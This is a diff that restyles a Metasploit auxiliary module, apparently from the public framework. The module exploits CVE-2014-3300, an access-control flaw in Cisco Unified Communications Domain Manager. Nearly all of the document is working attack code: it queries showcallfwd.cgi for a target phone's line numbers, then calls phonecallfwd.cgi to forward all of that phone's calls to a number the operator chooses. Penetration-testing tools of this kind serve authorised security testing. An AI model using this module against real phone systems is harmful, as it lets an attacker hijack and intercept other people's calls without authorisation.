@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,32 +8,30 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
-      'Description' => %q{
-        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
-        (CDM) 10 does not properly implement access control, which allows remote attackers to
-        modify user information. This module exploits the vulnerability to configure unauthorized
-        call forwarding.
-      },
-      'Author'      => 'fozavci',
-      'References'  =>
-        [
-          ['CVE', '2014-3300'],
-          ['BID', '68331']
-        ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Forward', { 'Description' => 'Enabling the call forwarding for the MAC address' } ],
-          [ 'Info', { 'Description' => 'Retrieving the call forwarding information for the MAC address' } ]
-        ],
-      'DefaultAction'  => 'Info'
-    ))
+                      'Name'        => 'Viproy CUCDM IP Phone XML Services - Call Forwarding Tool',
+                      'Description' => %q{
+                        The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager
+                        (CDM) 10 does not properly implement access control, which allows remote attackers to
+                        modify user information. This module exploits the vulnerability to configure unauthorized
+                        call forwarding.
+                      },
+                      'Author'      => 'fozavci',
+                      'References'  =>
+                        [
+                          ['CVE', '2014-3300'],
+                          ['BID', '68331']
+                        ],
+                      'License'     => MSF_LICENSE,
+                      'Actions'     =>
+                        [
+                          [ 'Forward', { 'Description' => 'Enabling the call forwarding for the MAC address' } ],
+                          [ 'Info', { 'Description' => 'Retrieving the call forwarding information for the MAC address' } ]
+                        ],
+                      'DefaultAction' => 'Info'))
 
     register_options(
       [
@@ -40,7 +39,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
         OptString.new('FORWARDTO', [ true, 'Number to forward all calls', '007']),
         OptString.new('FINTNUMBER', [ false, 'FINTNUMBER of IP Phones, required for multiple lines'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -59,17 +59,16 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Getting fintnumbers and display names of the IP phone")
 
     res = send_request_cgi(
-        {
-            'uri'    => normalize_uri(uri, 'showcallfwd.cgi'),
-            'method' => 'GET',
-            'vars_get' => {
-                'device' => "SEP#{mac}"
-            }
-        })
+      'uri' => normalize_uri(uri, 'showcallfwd.cgi'),
+      'method' => 'GET',
+      'vars_get' => {
+        'device' => "SEP#{mac}"
+      }
+    )
 
     unless res && res.code == 200 && res.body && res.body.to_s =~ /fintnumber/
       print_error("Target appears not vulnerable!")
-      print_status("#{res}")
+      print_status(res.to_s)
       return []
     end
 
@@ -81,9 +80,9 @@ class MetasploitModule < Msf::Auxiliary
 
     list.each do |lst|
       xlist = lst.get_elements('Name')
-      xlist.each {|l| lines << "#{l[0]}"}
+      xlist.each { |l| lines << (l[0]).to_s }
       xlist = lst.get_elements('URL')
-      xlist.each {|l| fint_numbers << "#{l[0].to_s.split('fintnumber=')[1]}" }
+      xlist.each { |l| fint_numbers << (l[0].to_s.split('fintnumber=')[1]).to_s }
     end
 
     lines.size.times do |i|
@@ -99,11 +98,11 @@ class MetasploitModule < Msf::Auxiliary
     forward_to = datastore["FORWARDTO"]
     mac = datastore["MAC"]
 
-    if datastore['FINTNUMBER']
-      fint_numbers = [datastore['FINTNUMBER']]
-    else
-      fint_numbers = get_info
-    end
+    fint_numbers = if datastore['FINTNUMBER']
+                     [datastore['FINTNUMBER']]
+                   else
+                     get_info
+                   end
 
     if fint_numbers.empty?
       print_error("FINTNUMBER required to forward calls")
@@ -111,31 +110,28 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     fint_numbers.each do |fintnumber|
-
       print_status("Sending call forward request for #{fintnumber}")
 
       send_request_cgi(
-          {
-              'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
-              'method' => 'GET',
-              'vars_get' => {
-                  'cfoption'     => 'CallForwardAll',
-                  'device'       => "SEP#{mac}",
-                  'ProviderName' => 'NULL',
-                  'fintnumber'   => "#{fintnumber}",
-                  'telno1'       => "#{forward_to}"
-              }
-          })
+        'uri'    => normalize_uri(uri, 'phonecallfwd.cgi'),
+        'method' => 'GET',
+        'vars_get' => {
+          'cfoption' => 'CallForwardAll',
+          'device'       => "SEP#{mac}",
+          'ProviderName' => 'NULL',
+          'fintnumber'   => fintnumber.to_s,
+          'telno1'       => forward_to.to_s
+        }
+      )
 
       res = send_request_cgi(
-          {
-              'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
-              'method' => 'GET',
-              'vars_get' => {
-                  'device'     => "SEP#{mac}",
-                  'fintnumber' => "#{fintnumber}"
-              }
-          })
+        'uri'    => normalize_uri(uri, 'showcallfwdperline.cgi'),
+        'method' => 'GET',
+        'vars_get' => {
+          'device' => "SEP#{mac}",
+          'fintnumber' => fintnumber.to_s
+        }
+      )
 
       if res && res.body && res.body && res.body.to_s =~ /CFA/
         print_good("Call forwarded successfully for #{fintnumber}")
@@ -144,5 +140,4 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   end
-
 end
